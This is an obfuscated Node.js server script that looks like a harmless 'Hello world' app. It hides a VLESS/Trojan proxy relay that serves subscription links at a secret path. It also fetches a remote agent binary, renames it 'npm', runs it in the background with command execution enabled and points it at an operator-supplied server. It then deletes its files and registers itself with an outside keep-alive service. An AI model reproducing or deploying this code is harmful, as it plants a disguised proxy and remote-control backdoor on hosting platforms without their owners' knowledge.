const _0x2c879b=_0x57fa;(function(_0x4c898b,_0x42bbe0){const _0x9cbf35=_0x57fa,_0x215fd8=_0x4c898b();while(!![]){try{const _0x1ed5d7=-parseInt(_0x9cbf35(0x1f3))/0x1+-parseInt(_0x9cbf35(0x20f))/0x2*(parseInt(_0x9cbf35(0x1c3))/0x3)+-parseInt(_0x9cbf35(0x21a))/0x4+parseInt(_0x9cbf35(0x20d))/0x5*(parseInt(_0x9cbf35(0x214))/0x6)+parseInt(_0x9cbf35(0x1f1))/0x7+-parseInt(_0x9cbf35(0x21c))/0x8+parseInt(_0x9cbf35(0x21f))/0x9*(parseInt(_0x9cbf35(0x1f9))/0xa);if(_0x1ed5d7===_0x42bbe0)break;else _0x215fd8['push'](_0x215fd8['shift']());}catch(_0xd15d36){_0x215fd8['push'](_0x215fd8['shift']());}}}(_0x2446,0x9522f));const os=require('os'),http=require(_0x2c879b(0x1ec)),fs=require('fs'),axios=require(_0x2c879b(0x1e3)),net=require('net'),path=require(_0x2c879b(0x203)),crypto=require('crypto'),{Buffer}=require(_0x2c879b(0x229)),{exec,execSync}=require(_0x2c879b(0x21d)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x2c879b(0x1ea)][_0x2c879b(0x224)]||'e345acd7-e128-4e5a-b941-6bd1fc877c16',NEZHA_SERVER=process[_0x2c879b(0x1ea)][_0x2c879b(0x1d8)]||'',NEZHA_PORT=process[_0x2c879b(0x1ea)][_0x2c879b(0x1dd)]||'',NEZHA_KEY=process[_0x2c879b(0x1ea)][_0x2c879b(0x22e)]||'',DOMAIN=process[_0x2c879b(0x1ea)][_0x2c879b(0x22a)]||_0x2c879b(0x1e0),AUTO_ACCESS=process[_0x2c879b(0x1ea)][_0x2c879b(0x1d0)]||!![],WSPATH=process['env'][_0x2c879b(0x205)]||UUID[_0x2c879b(0x20a)](0x0,0x8),SUB_PATH=process[_0x2c879b(0x1ea)][_0x2c879b(0x208)]||_0x2c879b(0x1e1),NAME=process[_0x2c879b(0x1ea)]['NAME']||'',PORT=process['env']['PORT']||0x1eb4;let ISP='';const GetISP=async()=>{const _0x59f24d=_0x2c879b;try{const _0x6eebd6=await axios[_0x59f24d(0x23b)](_0x59f24d(0x1e6)),_0x1e349b=_0x6eebd6[_0x59f24d(0x225)];ISP=(_0x1e349b['country_code']+'-'+_0x1e349b['isp'])['replace'](/ /g,'_');}catch(_0x4ce282){ISP=_0x59f24d(0x1fb);}};GetISP();const httpServer=http[_0x2c879b(0x22f)]((_0x353f5c,_0x25900c)=>{const _0x4707be=_0x2c879b;if(_0x353f5c[_0x4707be(0x232)]==='/'){const _0x541363=path[_0x4707be(0x1d2)](__dirname,_0x4707be(0x1c6));fs['readFile'](_0x541363,'utf8',(_0x56bdc8,_0x40340d)=>{const _0x51ff8d=_0x4707be;if(_0x56bdc8){_0x25900c['writeHead'](0xc8,{'Content-Type':'text/html'}),_0x25900c['end'](_0x51ff8d(0x219));return;}_0x25900c['writeHead'](0xc8,{'Content-Type':_0x51ff8d(0x1fc)}),_0x25900c[_0x51ff8d(0x1d4)](_0x40340d);});return;}else{if(_0x353f5c[_0x4707be(0x232)]==='/'+SUB_PATH){const _0x43dcfb=NAME?NAME+'-'+ISP:ISP,_0x197efd='vless://'+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+_0x4707be(0x206)+DOMAIN+_0x4707be(0x1cb)+WSPATH+'#'+_0x43dcfb,_0x5451ef=_0x4707be(0x1dc)+UUID+'@'+DOMAIN+_0x4707be(0x1e8)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x4707be(0x1cb)+WSPATH+'#'+_0x43dcfb,_0x8269a7=_0x197efd+'\x0a'+_0x5451ef,_0xcc1c8b=Buffer[_0x4707be(0x21e)](_0x8269a7)['toString'](_0x4707be(0x1cc));_0x25900c[_0x4707be(0x1f4)](0xc8,{'Content-Type':_0x4707be(0x1fe)}),_0x25900c[_0x4707be(0x1d4)](_0xcc1c8b+'\x0a');}else _0x25900c['writeHead'](0x194,{'Content-Type':'text/plain'}),_0x25900c['end']('Not\x20Found\x0a');}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x2c879b(0x1d3)](/-/g,''),DNS_SERVERS=[_0x2c879b(0x237),_0x2c879b(0x1f7)];function resolveHost(_0xda8aff){return new Promise((_0x492533,_0x3a3dc2)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0xda8aff)){_0x492533(_0xda8aff);return;}let _0xc26053=0x0;function _0x4313f1(){const _0xfc9a8d=_0x57fa;if(_0xc26053>=DNS_SERVERS[_0xfc9a8d(0x210)]){_0x3a3dc2(new Error(_0xfc9a8d(0x1ff)+_0xda8aff+_0xfc9a8d(0x1c8)));return;}const _0x5e4245=DNS_SERVERS[_0xc26053];_0xc26053++;const _0x2045ed=_0xfc9a8d(0x1f0)+encodeURIComponent(_0xda8aff)+_0xfc9a8d(0x216);axios[_0xfc9a8d(0x23b)](_0x2045ed,{'timeout':0x1388,'headers':{'Accept':_0xfc9a8d(0x228)}})['then'](_0x5103aa=>{const _0x2d964a=_0xfc9a8d,_0x19a917=_0x5103aa[_0x2d964a(0x225)];if(_0x19a917['Status']===0x0&&_0x19a917[_0x2d964a(0x23d)]&&_0x19a917[_0x2d964a(0x23d)][_0x2d964a(0x210)]>0x0){const _0x537f7e=_0x19a917[_0x2d964a(0x23d)][_0x2d964a(0x207)](_0x5109c5=>_0x5109c5[_0x2d964a(0x1d5)]===0x1);if(_0x537f7e){_0x492533(_0x537f7e[_0x2d964a(0x225)]);return;}}_0x4313f1();})[_0xfc9a8d(0x1c5)](_0x5a85bf=>{_0x4313f1();});}_0x4313f1();});}function handleVlessConnection(_0x2ea478,_0x304c1c){const _0x9ef243=_0x2c879b,[_0x290ba7]=_0x304c1c,_0x5831e5=_0x304c1c['slice'](0x1,0x11);if(!_0x5831e5[_0x9ef243(0x227)]((_0xd8f124,_0x3ee986)=>_0xd8f124==parseInt(uuid['substr'](_0x3ee986*0x2,0x2),0x10)))return![];let _0x2e81d5=_0x304c1c[_0x9ef243(0x20a)](0x11,0x12)['readUInt8']()+0x13;const _0x30dbf9=_0x304c1c[_0x9ef243(0x20a)](_0x2e81d5,_0x2e81d5+=0x2)[_0x9ef243(0x1ca)](0x0),_0x309ee6=_0x304c1c[_0x9ef243(0x20a)](_0x2e81d5,_0x2e81d5+=0x1)['readUInt8'](),_0x40d0b9=_0x309ee6==0x1?_0x304c1c[_0x9ef243(0x20a)](_0x2e81d5,_0x2e81d5+=0x4)[_0x9ef243(0x1d2)]('.'):_0x309ee6==0x2?new TextDecoder()['decode'](_0x304c1c[_0x9ef243(0x20a)](_0x2e81d5+0x1,_0x2e81d5+=0x1+_0x304c1c[_0x9ef243(0x20a)](_0x2e81d5,_0x2e81d5+0x1)[_0x9ef243(0x1f2)]())):_0x309ee6==0x3?_0x304c1c[_0x9ef243(0x20a)](_0x2e81d5,_0x2e81d5+=0x10)['reduce']((_0x17d31e,_0x3218c1,_0x1a5d46,_0x1da50e)=>_0x1a5d46%0x2?_0x17d31e[_0x9ef243(0x1f5)](_0x1da50e[_0x9ef243(0x20a)](_0x1a5d46-0x1,_0x1a5d46+0x1)):_0x17d31e,[])[_0x9ef243(0x201)](_0x4e2e64=>_0x4e2e64[_0x9ef243(0x1ca)](0x0)['toString'](0x10))['join'](':'):'';_0x2ea478['send'](new Uint8Array([_0x290ba7,0x0]));const _0x23eb21=createWebSocketStream(_0x2ea478);return resolveHost(_0x40d0b9)[_0x9ef243(0x22b)](_0x2c6175=>{const _0xc8c81f=_0x9ef243;net['connect']({'host':_0x2c6175,'port':_0x30dbf9},function(){const _0x2a34fd=_0x57fa;this[_0x2a34fd(0x1fa)](_0x304c1c['slice'](_0x2e81d5)),_0x23eb21['on']('error',()=>{})['pipe'](this)['on']('error',()=>{})[_0x2a34fd(0x211)](_0x23eb21);})['on'](_0xc8c81f(0x1d7),()=>{});})[_0x9ef243(0x1c5)](_0x30310e=>{const _0x2e6311=_0x9ef243;net[_0x2e6311(0x1de)]({'host':_0x40d0b9,'port':_0x30dbf9},function(){const _0x461e30=_0x2e6311;this[_0x461e30(0x1fa)](_0x304c1c[_0x461e30(0x20a)](_0x2e81d5)),_0x23eb21['on'](_0x461e30(0x1d7),()=>{})[_0x461e30(0x211)](this)['on'](_0x461e30(0x1d7),()=>{})[_0x461e30(0x211)](_0x23eb21);})['on'](_0x2e6311(0x1d7),()=>{});}),!![];}function handleTrojanConnection(_0x42f1cb,_0x2f77c7){const _0x5a43f5=_0x2c879b;try{if(_0x2f77c7['length']<0x3a)return![];const _0x26b321=_0x2f77c7[_0x5a43f5(0x20a)](0x0,0x38)['toString'](),_0x48d60f=[UUID];let _0x692170=null;for(const _0x39129c of _0x48d60f){const _0x3fe643=crypto[_0x5a43f5(0x23a)](_0x5a43f5(0x1f6))[_0x5a43f5(0x1ef)](_0x39129c)['digest'](_0x5a43f5(0x1fd));if(_0x3fe643===_0x26b321){_0x692170=_0x39129c;break;}}if(!_0x692170)return![];let _0x1b0393=0x38;_0x2f77c7[_0x1b0393]===0xd&&_0x2f77c7[_0x1b0393+0x1]===0xa&&(_0x1b0393+=0x2);const _0x3a19b0=_0x2f77c7[_0x1b0393];if(_0x3a19b0!==0x1)return![];_0x1b0393+=0x1;const _0x5a8c0c=_0x2f77c7[_0x1b0393];_0x1b0393+=0x1;let _0x1742ba,_0x2fdb40;if(_0x5a8c0c===0x1)_0x1742ba=_0x2f77c7[_0x5a43f5(0x20a)](_0x1b0393,_0x1b0393+0x4)[_0x5a43f5(0x1d2)]('.'),_0x1b0393+=0x4;else{if(_0x5a8c0c===0x3){const _0x49f496=_0x2f77c7[_0x1b0393];_0x1b0393+=0x1,_0x1742ba=_0x2f77c7[_0x5a43f5(0x20a)](_0x1b0393,_0x1b0393+_0x49f496)[_0x5a43f5(0x1e4)](),_0x1b0393+=_0x49f496;}else{if(_0x5a8c0c===0x4)_0x1742ba=_0x2f77c7[_0x5a43f5(0x20a)](_0x1b0393,_0x1b0393+0x10)[_0x5a43f5(0x20b)]((_0x4b5cae,_0x678d8a,_0x48210c,_0x83b7fe)=>_0x48210c%0x2?_0x4b5cae[_0x5a43f5(0x1f5)](_0x83b7fe[_0x5a43f5(0x20a)](_0x48210c-0x1,_0x48210c+0x1)):_0x4b5cae,[])[_0x5a43f5(0x201)](_0x5bb70d=>_0x5bb70d[_0x5a43f5(0x1ca)](0x0)['toString'](0x10))[_0x5a43f5(0x1d2)](':'),_0x1b0393+=0x10;else return![];}}_0x2fdb40=_0x2f77c7['readUInt16BE'](_0x1b0393),_0x1b0393+=0x2;_0x1b0393<_0x2f77c7[_0x5a43f5(0x210)]&&_0x2f77c7[_0x1b0393]===0xd&&_0x2f77c7[_0x1b0393+0x1]===0xa&&(_0x1b0393+=0x2);const _0x4713c0=createWebSocketStream(_0x42f1cb);return resolveHost(_0x1742ba)[_0x5a43f5(0x22b)](_0x239030=>{const _0x352899=_0x5a43f5;net['connect']({'host':_0x239030,'port':_0x2fdb40},function(){const _0x119135=_0x57fa;_0x1b0393<_0x2f77c7[_0x119135(0x210)]&&this[_0x119135(0x1fa)](_0x2f77c7['slice'](_0x1b0393)),_0x4713c0['on'](_0x119135(0x1d7),()=>{})['pipe'](this)['on'](_0x119135(0x1d7),()=>{})[_0x119135(0x211)](_0x4713c0);})['on'](_0x352899(0x1d7),()=>{});})['catch'](_0x110807=>{const _0x34e8aa=_0x5a43f5;net[_0x34e8aa(0x1de)]({'host':_0x1742ba,'port':_0x2fdb40},function(){const _0x34ca51=_0x34e8aa;_0x1b0393<_0x2f77c7[_0x34ca51(0x210)]&&this['write'](_0x2f77c7[_0x34ca51(0x20a)](_0x1b0393)),_0x4713c0['on'](_0x34ca51(0x1d7),()=>{})['pipe'](this)['on'](_0x34ca51(0x1d7),()=>{})[_0x34ca51(0x211)](_0x4713c0);})['on']('error',()=>{});}),!![];}catch(_0x101509){return![];}}wss['on']('connection',(_0x55872e,_0x10066f)=>{const _0x3f151c=_0x2c879b,_0x152b5e=_0x10066f[_0x3f151c(0x232)]||'';_0x55872e[_0x3f151c(0x230)]('message',_0x33db3b=>{const _0x1e65db=_0x3f151c;if(_0x33db3b['length']>0x11&&_0x33db3b[0x0]===0x0){const _0x48fe10=_0x33db3b[_0x1e65db(0x20a)](0x1,0x11),_0xefab2=_0x48fe10[_0x1e65db(0x227)]((_0x63bcad,_0x5ee8d7)=>_0x63bcad==parseInt(uuid['substr'](_0x5ee8d7*0x2,0x2),0x10));if(_0xefab2){!handleVlessConnection(_0x55872e,_0x33db3b)&&_0x55872e[_0x1e65db(0x222)]();return;}}!handleTrojanConnection(_0x55872e,_0x33db3b)&&_0x55872e[_0x1e65db(0x222)]();})['on'](_0x3f151c(0x1d7),()=>{});});function _0x57fa(_0x4f38f8,_0x48228a){_0x4f38f8=_0x4f38f8-0x1c3;const _0x2446e8=_0x2446();let _0x57fa6c=_0x2446e8[_0x4f38f8];return _0x57fa6c;}const getDownloadUrl=()=>{const _0x5e4515=_0x2c879b,_0x100a52=os['arch']();return _0x100a52===_0x5e4515(0x220)||_0x100a52==='arm64'||_0x100a52===_0x5e4515(0x221)?!NEZHA_PORT?_0x5e4515(0x1da):_0x5e4515(0x223):!NEZHA_PORT?_0x5e4515(0x233):_0x5e4515(0x22c);},downloadFile=async()=>{const _0x4c28d0=_0x2c879b;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x30b267=getDownloadUrl(),_0x180cf3=await axios({'method':_0x4c28d0(0x23b),'url':_0x30b267,'responseType':_0x4c28d0(0x1e9)}),_0x3cd6ae=fs[_0x4c28d0(0x22d)](_0x4c28d0(0x235));return _0x180cf3['data'][_0x4c28d0(0x211)](_0x3cd6ae),new Promise((_0x249786,_0x50f2b7)=>{const _0x626f69=_0x4c28d0;_0x3cd6ae['on'](_0x626f69(0x1cd),()=>{const _0x5b4bd7=_0x626f69;console[_0x5b4bd7(0x204)](_0x5b4bd7(0x1cf)),exec(_0x5b4bd7(0x1ce),_0xe8ca35=>{if(_0xe8ca35)_0x50f2b7(_0xe8ca35);_0x249786();});}),_0x3cd6ae['on'](_0x626f69(0x1d7),_0x50f2b7);});}catch(_0x4b8b84){throw _0x4b8b84;}},runnz=async()=>{const _0x2f9266=_0x2c879b;try{const _0x482706=execSync(_0x2f9266(0x1e5),{'encoding':_0x2f9266(0x1db)});if(_0x482706['trim']()!==''){console['log'](_0x2f9266(0x1c7));return;}}catch(_0x214b0d){}await downloadFile();let _0x2820c8='',_0x989bd1=[_0x2f9266(0x231),_0x2f9266(0x239),_0x2f9266(0x1d6),_0x2f9266(0x1e2),_0x2f9266(0x1d1),_0x2f9266(0x1f8)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x4886f7=_0x989bd1['includes'](NEZHA_PORT)?_0x2f9266(0x1d9):'';_0x2820c8=_0x2f9266(0x218)+NEZHA_SERVER+':'+NEZHA_PORT+_0x2f9266(0x238)+NEZHA_KEY+'\x20'+_0x4886f7+_0x2f9266(0x200);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x23dd9d=NEZHA_SERVER[_0x2f9266(0x20e)](':')?NEZHA_SERVER['split'](':')[_0x2f9266(0x1ed)]():'',_0x5044df=_0x989bd1['includes'](_0x23dd9d)?_0x2f9266(0x1df):_0x2f9266(0x236),_0x2737a3=_0x2f9266(0x212)+NEZHA_KEY+_0x2f9266(0x21b)+NEZHA_SERVER+_0x2f9266(0x1eb)+_0x5044df+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x2f9266(0x217)](_0x2f9266(0x215),_0x2737a3);}_0x2820c8=_0x2f9266(0x213);}else{console[_0x2f9266(0x204)](_0x2f9266(0x1ee));return;}}try{exec(_0x2820c8,{'shell':_0x2f9266(0x209)},_0x3cd6f6=>{const _0x3cdfcc=_0x2f9266;if(_0x3cd6f6)console[_0x3cdfcc(0x1d7)]('npm\x20running\x20error:',_0x3cd6f6);else console[_0x3cdfcc(0x204)](_0x3cdfcc(0x234));});}catch(_0x55e06d){console['error'](_0x2f9266(0x20c)+_0x55e06d);}};async function addAccessTask(){const _0x82f9cf=_0x2c879b;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x97e9de='https://'+DOMAIN;try{const _0x900777=await axios[_0x82f9cf(0x1c4)](_0x82f9cf(0x1e7),{'url':_0x97e9de},{'headers':{'Content-Type':_0x82f9cf(0x1c9)}});console[_0x82f9cf(0x204)]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x2fb011){}}function _0x2446(){const _0x52c3d1=['update','https://dns.google/resolve?name=','2720123hyGtqI','readUInt8','900317aGKyBg','writeHead','concat','sha224','1.1.1.1','2053','20TyGeGk','write','Unknown','text/html','hex','text/plain','Failed\x20to\x20resolve\x20','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','map','unlink','path','log','WSPATH','&fp=chrome&type=ws&host=','find','SUB_PATH','/bin/bash','slice','reduce','error:\x20','991745iklVev','includes','20446FzQYIs','length','pipe','client_secret:\x20','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','30cYiqxm','config.yaml','&type=A','writeFileSync','setsid\x20nohup\x20./npm\x20-s\x20','Hello\x20world!','2548156mhJiji','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','1657480ItwmPv','child_process','from','8252109xbZphC','arm','aarch64','close','https://arm64.ssss.nyc.mn/agent','UUID','data','listen','every','application/dns-json','buffer','DOMAIN','then','https://amd64.ssss.nyc.mn/agent','createWriteStream','NEZHA_KEY','createServer','once','443','url','https://amd64.ssss.nyc.mn/v1','npm\x20is\x20running','npm','false','8.8.4.4','\x20-p\x20','8443','createHash','get','Server\x20is\x20running\x20on\x20port\x20','Answer','252NMtwWY','post','catch','index.html','npm\x20is\x20already\x20running,\x20skip\x20running...','\x20with\x20all\x20DNS\x20servers','application/json','readUInt16BE','&path=%2F','base64','finish','chmod\x20+x\x20npm','npm\x20download\x20successfully','AUTO_ACCESS','2083','join','replace','end','type','2096','error','NEZHA_SERVER','--tls','https://arm64.ssss.nyc.mn/v1','utf-8','trojan://','NEZHA_PORT','connect','true','1234.abc.com','sub','2087','axios','toString','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','https://api.ip.sb/geoip','https://oooo.serv00.net/add-url',':443?security=tls&sni=','stream','env','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','http','pop','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running'];_0x2446=function(){return _0x52c3d1;};return _0x2446();}const delFiles=()=>{const _0x30ceec=_0x2c879b;fs[_0x30ceec(0x202)](_0x30ceec(0x235),()=>{}),fs[_0x30ceec(0x202)]('config.yaml',()=>{});};httpServer[_0x2c879b(0x226)](PORT,()=>{const _0x10f06b=_0x2c879b;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x10f06b(0x204)](_0x10f06b(0x23c)+PORT);});
